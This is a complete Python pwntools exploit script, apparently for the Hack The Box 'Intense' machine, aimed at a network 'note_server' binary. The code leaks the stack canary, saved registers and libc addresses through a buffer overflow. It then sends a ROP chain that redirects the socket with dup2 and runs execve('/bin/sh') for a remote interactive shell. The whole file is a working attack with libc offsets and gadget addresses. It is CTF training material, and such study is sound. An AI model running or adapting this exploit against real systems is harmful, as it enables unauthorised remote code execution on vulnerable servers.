import struct, binascii
from pwn import * 
context(os="linux", arch="amd64")
import pdb
import sys
import time
from termcolor import colored
import argparse
import pyfiglet

########## consigne
# sometimes manually with :rp-lin-x64 -f note_server --unique -r 1 | grep -i pop
# can'tfind the gadget we want, but pwn rop tool can find it !!!
# so think to use it despite of we didnt found it manually 

BUFFER_SIZE =1024
CMD1= binascii.unhexlify("01")
CMD2= binascii.unhexlify("02")
READ_BUFFER=CMD3 = binascii.unhexlify("03")
FILE_DESCRIPTOR=4

#payload =struct.pack('>Q', 0x0105414243444503)
#payload="\x01\x05"+"\x41"*5+"\x03" # test put AAAAA into receive it
#payload = p64("0x01024142")
#p.sendline(payload)
#print(p.recv())

##### test the bof
# write into all the buffer and read the input
#pattern_create of 255 
pattern= """AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%"""

# Args loader
arg_parser = argparse.ArgumentParser(description='Intense binary root exploit')
arg_parser.add_argument('-i','--ip', dest='ip', help='The ipaddress of server', required=True, type=str)
arg_parser.add_argument('-p','--port', dest='port', help='The port ', required=True, type=int)
arg_parser.add_argument('-l','--locally', dest='locally', help='Exploit the local server', action="store_true")
arg_parser.add_argument('-m','--manual', dest='manual', help='Use a manual ropchains payloads', action="store_true")
args = arg_parser.parse_args()
# Roughiz banner
print("")
ascii_banner = pyfiglet.figlet_format("R@()Gh1z Htb Intense")
print(ascii_banner)
print(colored('Find all scripts in: https://github.com/roughiz\n\n', "green"))
print(colored("Intense exploit script by R0()Gh1z", "green"))
print("-=" * 50+"\n")
print("")


def payload_template_header():
    payload=""
    payload+=CMD1+ binascii.unhexlify("04"+4*"41") # 4 byte ant the strat of the offset 
    payload+= CMD1+ binascii.unhexlify("08"+8*"42") # 8 bytes of junk just before reach the canary
    return payload

def put_over_buffer(p,nb):
    payload_bof = CMD2
    payload_bof += struct.pack('<H',4) #"\x04\x00" # 2byts wich represent 4bytes(offset)  ( 0<offset<=index) In little endian
    payload_bof+= struct.pack('<B',nb) #"\xff"     # try to put 255 bytes over the buffer(copy_size) this puted bytes represent pattern
    payload_bof+= READ_BUFFER
    p.send(payload_bof)

def payload_template_footer(buff):
    for i in range(0,3): # print 255*3 why 255 cause we can also have 1 byte to put the size of the bufffer to write into notes so we will send =>4+255+3*255= 4+255+765= 1024 (255=0xff)
        buff+= CMD1+binascii.unhexlify("ff"+255*"43")
    return buff 

def get_next_byte(s, r,k):# buffer,range,canary_byte_number
    #try each byte from int(0) to int(255) until it works 
    for i in r:
        p = remote(args.ip,args.port)
        try:
            payload= payload_template_header()
            len_of_new_pld =255-8-len(s)-1
            payload+=CMD1 +struct.pack('<B',255-8) # preapre the payload lenght with cmd1
            payload+=s + i.to_bytes(1,'big') +binascii.unhexlify(len_of_new_pld*"43")
            payload= payload_template_footer(payload)
            p.send(payload)
            put_over_buffer(p,8+k) # 8 bytes before reach the canary + k bytes to test
            print(p.recv())
            p.close()
            return i.to_bytes(1,'big')
        except EOFError:
            print("No response. maybe smach %s"% i.to_bytes(1,'big'))
            p.close()
    import pdb   # Shouldn't get here
    pdb.set_trace()
    print("Failed to find byte")


def brute_word(buff, num_bytes, obj, assumed=b''):
    start = time.time()
    result = assumed
    with log.progress(f'Brute forcing {obj}') as p:
        for i in range(num_bytes):
            current = '0x' + ''.join([f'{x:02x}' for x in result[::-1]]).rjust(16,'_')  # write the string '0x________________'
            p.status(f'Found {len(result)} bytes: {current}')
            byte = None
            context.log_level = 'error'  # Hide "Opening connection" and "Closing connection" messages
            while byte == None:          # If no byte found, over range again
                byte = get_next_byte(result, range(0,255),i+1)
            result = result + byte
            context.log_level = 'info'   # Re-enable logging
        p.success(f'Finished in {time.time() - start:.2f} seconds')

    log.success(f"{obj}:".ljust(20,' ') + f"0x{u64(result):016x}")
    return result

def put_payload_into_notebuffer(canary=None,rbp=None,payload=None,full=True):
   if full: # putt junk into all the buffer size
           payload_fullbuff=CMD1+ binascii.unhexlify("04"+4*"41") # 4 byte ant the strat of the offset
           for i in range(0,4): # print 255*4 why 255 cause we can also have 1 byte to put the size of the bufffer to write into notes so we will send =>4+255= 4+1020= 1024 (255=0xff)
               payload_fullbuff+= CMD1+ binascii.unhexlify("ff"+255*"42" )
   else:
	   len_rop=len(payload)
	   restfor_junk=255-8-16-len_rop
	   payload_fullbuff=CMD1+ struct.pack("<B",12)+binascii.unhexlify(12*"41") #12 byte for the strat of the offset +  8 bytes of junk just before reach the canary  
	   payload_fullbuff+= CMD1+ struct.pack("<B",16) +p64(canary) + p64(rbp)   # CANARY + RBP
	   payload_fullbuff+=CMD1+ struct.pack("<B",len_rop)+ payload          # the rop gadgets replacing the rip 
	   payload_fullbuff+=CMD1+ struct.pack("<B",restfor_junk)+binascii.unhexlify(restfor_junk*"42")  # rest junk 
	   for i in range(0,3): # print 255*3 why 255 cause we can also have 1 byte to put the size of the bufffer to write into notes so we will send =>4+255+3*255= 4+255+765= 1024 (255=0xff)
	      payload_fullbuff+= CMD1+ binascii.unhexlify("ff"+255*"42" )   # junk
   return payload_fullbuff 


def copy_to_note(offset,copy_size):
    payload_copy = CMD2
    payload_copy += struct.pack('<H',offset) # 2byts wich represent 4bytes(offset)  ( 0<offset=4<=index) In little endian 
    payload_copy+= struct.pack("<B",copy_size)     # try to put 32 bytes over the buffer(copy_size) (8junk +8 for canary +8 for rbp + 8for rsp)
    payload_copy+= READ_BUFFER 
    return payload_copy

def read_canary_ebp_rsp():
    payload_fullbuff= put_payload_into_notebuffer()

    #Now index =1024, let's use CMD2 and define offset as 1024 and use memcpy() to copy the canary rbp and rsp into the end of the node[]
    payload_bof =copy_to_note(1024,32)    
    # send the two payload and read the three registers
    p = remote(args.ip,args.port)
    p.send(payload_fullbuff)  # send the payload to put all in the note buffer
    p.send(payload_bof)   # throw bof wiht cmd2

    data= p.recv()
    canary=u64(data[1024+8:1024+16])
    RBP=u64(data[1024+16:1024+24])
    RIP=u64(data[1024+24:1024+32])
    
    canary_formated = binascii.hexlify(struct.pack(">Q",canary)).decode() # fromated address to little endian and in hexa form 
    RBP_formated = binascii.hexlify(struct.pack(">Q",RBP)).decode() # fromated address to little endian and in hexa form 
    RIP_formated = binascii.hexlify(struct.pack(">Q",RIP)).decode() # fromated address to little endian and in hexa form 

    print(colored("Canary: 0x%s "%canary_formated,"green"))
    print(colored("RBP:    0x%s "%RBP_formated,"green"))
    print(colored("RIP:    0X%s "%RIP_formated,"green"))
    p.close()
    return (canary,RBP,RIP)

def read_write_libc_fct_address(binary,canary,rbp,base_address):

   elf= ELF(binary, checksec=False)
   elf.address = base_address
   rop = ROP(elf)
   # create the rop gadgets representing : write(file_descriptot=4,write@GOT())  file_descriptor = 4 ( our client )
   rop.write(FILE_DESCRIPTOR,elf.got['write'])
   log.info('stage 1 ROP Chain :' + rop.dump())
   len_rop=len(rop.chain())
   ## try got write
   payload_fullbuff=put_payload_into_notebuffer(canary,rbp,rop.chain(),False)

   #Now index =1024, let's use CMD2 and define offset as 4 and use memcpy() to copy the canary rbp and rop into the end of the node[]
   copy_size = 8+16+len_rop # the size of buffer to cpy
   payload_bof =copy_to_note(4,copy_size)

   # send to payload
   p = remote(args.ip,args.port)
   p.send(payload_fullbuff)  # send the payload to put all in the note buffer
   p.send(payload_bof)   # throw bof wiht cmd2
   # read the first buffer+copying data over the buffer
   data= p.recv(1024+copy_size)

   print(colored("Data Length %s"%len(data),"green"))
   #print(colored("Data: %s"%binascii.hexlify(data),"green"))
   write_libc_address = p.recv(8,timeout=4) # read the write() address with the rop chains. its the write address from Libc
   write_libc_address_formed =struct.pack(">Q",u64(write_libc_address))
   print(colored("write_plt_address Length %s"%len(write_libc_address),"green"))
   print(colored("write_plt_address: 0x%s  "%binascii.hexlify(write_libc_address_formed).decode(),"green"))
   p.close()
   return u64(write_libc_address)

def execute_revshell(canary,rbp,elf_libc,write_libc_address,manually=False,locally=False):
   # at this time we have to overwrite the buffer with canary ebp and rop gadget to execute 
   #  when we execute the function "execute("/bin/sh",0,0) in the remote server the output will be send to the default file_descriptor stdout(1). and so we will not receive anything
   #  the idea is to use the function "dup2(int olfd, int newfd)" which will change the oldfd to newfd like : newfd= oldfd. we will duplicate the File_Descriptor(4) into stdout(1)
   # and the stdin to our socket client file_descriptor and also the sterr to our socket client like:
   #  dup2(File_Descriptor,1)
   #  dup2(File_Descriptor,0)
   #  dup2(File_Descriptor,2)
   #  And finnaly run execve('/bin/sh',0,0)
   # to do we need offsets of theses functions and ropgadgets from libc, and add each offset to the libc_base
   
   if manually:
       if locally:
	     # readelf -s /lib/x86_64-linux-gnu/libc-2.28.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
		# 1010: 00000000000eabf0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
		# 1506: 00000000000c6a00    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
		# 2267: 00000000000ea4f0   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5

	     # strings -a -t x /lib/x86_64-linux-gnu/libc-2.28.so | grep -i "/bin/sh"                                            
		# 181519 /bin/sh

	    #  rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.28.so --unique -r 1 | grep -i "pop rdi "
	       # 0x00023a5f: pop rdi ; ret  ;

	    #  rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.28.so --unique -r 1 | grep -i "pop rsi" 
	       # 0x0002440e: pop rsi ; ret  ;  (171 found)

	    #  rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.28.so --unique -r 1 | grep -i "pop rdx"
	       # 0x00106725: pop rdx ; ret  ;  (1 found)

	       write_offset_libc= 0x00000000000ea4f0
	       dup2_offset_libc = 0x00000000000eabf0
	       execve_offset_libc = 0x00000000000c6a00
	       binsh_offset_libc =  0x181519
	       pop_rdi_ret_offset = 0x00023a5f
	       pop_rsi_ret_offset = 0x0002440e
	       pop_rdx_ret_offset = 0x00106725

	       libc_base = write_libc_address - write_offset_libc
	       dup2_address = p64(dup2_offset_libc + libc_base)
	       execve_address = p64(execve_offset_libc+libc_base)
	       binsh_address = p64(binsh_offset_libc+libc_base)   
	       pop_rdi_ret_address = p64(pop_rdi_ret_offset +libc_base)
	       pop_rsi_ret_address = p64(pop_rsi_ret_offset +libc_base)
	       pop_rdx_ret_address = p64(pop_rdx_ret_offset +libc_base)
       else:
	     # readelf -s remote_libc.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
              #999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
              #1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
              #2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5


	     # strings -a -t x remote_libc.so | grep -i "/bin/sh"                                            
		# 1b3e9a /bin/sh

	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdi "
	       # 0x0002155f: pop rdi ; ret  ;  (490 found)

	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rsi" 
	       # 0x00023e6a: pop rsi ; ret  ;  (147 found)

	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdx"
	       # 0x00001b96: pop rdx ; ret  ;  (6 found)

	       write_offset_libc= 0x0000000000110140
	       dup2_offset_libc = 0x00000000001109a0
	       execve_offset_libc = 0x00000000000e4e30
	       binsh_offset_libc =  0x1b3e9a
	       pop_rdi_ret_offset = 0x0002155f
	       pop_rsi_ret_offset = 0x00023e6a
	       pop_rdx_ret_offset = 0x00001b96

	       libc_base = write_libc_address - write_offset_libc
	       dup2_address = p64(dup2_offset_libc + libc_base)
	       execve_address = p64(execve_offset_libc+libc_base)
	       binsh_address = p64(binsh_offset_libc+libc_base)   
	       pop_rdi_ret_address = p64(pop_rdi_ret_offset +libc_base)
	       pop_rsi_ret_address = p64(pop_rsi_ret_offset +libc_base)
	       pop_rdx_ret_address = p64(pop_rdx_ret_offset +libc_base)
       # create payloads
       # first rop chains to execute: dup2(FILE_DESCRIPTOR,1) 
       # in asm:
        #pop rdi, ret # set the arg1 (File_DESCRIPTOR==4)
        #pop rsi, ret # set arg2      (stdout=1)
        #call dup2(4,1) redirect stout
       payload_dup2=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(1)
       payload_dup2+=dup2_address
        #call dup2(4,0) redirect stdin
       payload_dup2+=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(0)
       payload_dup2+=dup2_address
        #call dup2(4,2) redirect stderror
       payload_dup2+=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(2)
       payload_dup2+=dup2_address
       
       # second ropchains to execve("/bin/sh",0,0)
       # in asm:
        #pop rdi, ret # set the arg1 ("/bin/sh" address)
        #pop rsi, ret # set arg2      (0)
        #pop rdx, ret # set arg3      (0)
        #call execve
       payload_execve=pop_rdi_ret_address
       payload_execve+=binsh_address
       payload_execve+=pop_rsi_ret_address
       payload_execve+=p64(0)
       payload_execve+=pop_rdx_ret_address
       payload_execve+=p64(0)
       payload_execve+=execve_address
       # Final payload
       final_payload= payload_dup2 +payload_execve
   else:
       # use the pwntools more simple 
       libc_base = write_libc_address - elf_libc.symbols['write']
       elf_libc.address =  libc_base
       rop = ROP(elf_libc) 
       # create rop for dup2(FILE_DESCRIPTOR,1)
       rop.call(elf_libc.symbols['dup2'],[FILE_DESCRIPTOR,1])
       # create rop for dup2(FILE_DESCRIPTOR,0)
       rop.call(elf_libc.symbols['dup2'],[FILE_DESCRIPTOR,0])
       # create rop for dup2(FILE_DESCRIPTOR,2)
       rop.call(elf_libc.symbols['dup2'],[FILE_DESCRIPTOR,2])
       rop.call(elf_libc.symbols['execve'],[next(elf_libc.search(b'/bin/sh\x00')), 0, 0])
       # Nota: if we have the error "TypeError: a bytes-like object is required, not 'str'" think to use b'' instead of str because the elf is opened in binary mode
       log.info('stage 1 ROP Chain call dup2(4,1), and execve("/bin/sh",0,0) :' + rop.dump())
       final_payload= rop.chain()
  
   #put junk and rops chain in the ote buffer 
   len_rop=len(final_payload)
   payload_fullbuff=put_payload_into_notebuffer(canary,rbp,final_payload,False)
   #Now index =1024, let's use CMD2 and define offset as 4 and use memcpy() to copy the canary rbp and rop into the end and ropchains of the node[]
   copy_size = 8+16+len_rop # the size of buffer to cpy
   payload_bof =copy_to_note(4,copy_size)
   # send to payloads
   p = remote(args.ip,args.port)
   p.send(payload_fullbuff)  # send the payload to put all in the note buffer
   p.send(payload_bof)   # throw bof wiht cmd2
   # got an interactieshellwith pwn interactive() fct
   p.recv(1024+copy_size)
   p.interactive()
   

canary,rbp,rip = read_canary_ebp_rsp()
if args.locally : # the local server is different because i added some functions for debbuging 
   base_address = rip - 0x102e # 0x caught with the (rip - base addresse) For base address gdb-peda$ vmmap and   gdb-peda$ p 0x000055555555502e - 0x555555554000
   libc= ELF('/lib/x86_64-linux-gnu/libc-2.28.so', checksec=False)
   binary="modified_note_server"
else:
   base_address = rip - 0xf54 # 0x caught with the (rip - base addresse) For base address gdb-peda$ vmmap and   gdb-peda$ p 0X0000555555554f54 - 0x0000555555554000
   libc= ELF('remote_libc.so', checksec=False) # the libc used by the remote server, copying from victim machine. use ldd ./note_server 
   binary="note_server"

# leak the write_libc address
ba = binascii.hexlify(struct.pack(">Q",base_address)).decode() # fromated address to little endian and in hexa form 
print(colored("Base adress of Binary: 0x%s "%ba,"green"))
write_libc_address = read_write_libc_fct_address(binary,canary,rbp,base_address)

# Final stage execting the rev shell 
execute_revshell(canary,rbp,libc,write_libc_address,args.manual,args.locally)
